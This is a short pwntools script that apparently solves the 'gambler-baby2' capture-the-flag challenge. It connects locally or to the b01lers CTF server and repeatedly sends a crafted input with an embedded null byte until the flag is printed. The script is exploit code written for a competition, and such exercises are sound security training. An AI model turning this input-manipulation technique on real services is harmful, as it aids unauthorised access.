#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./gambler-baby2', checksec=False)

if args.REMOTE:
	p = remote('ctf.b01lers.com', 9203)
	flag = b'bctf{'
else:
	p = process(binary.path)
	flag = b'flag{'

while True:
	if flag in p.recvuntil([b'letters: ',flag]):
		flag += p.recvline().strip()
		p.close()
		print(flag.decode())
		break

	word = 7 * b'A' + b'\0' + 7 * b'A'
	p.sendline(word)
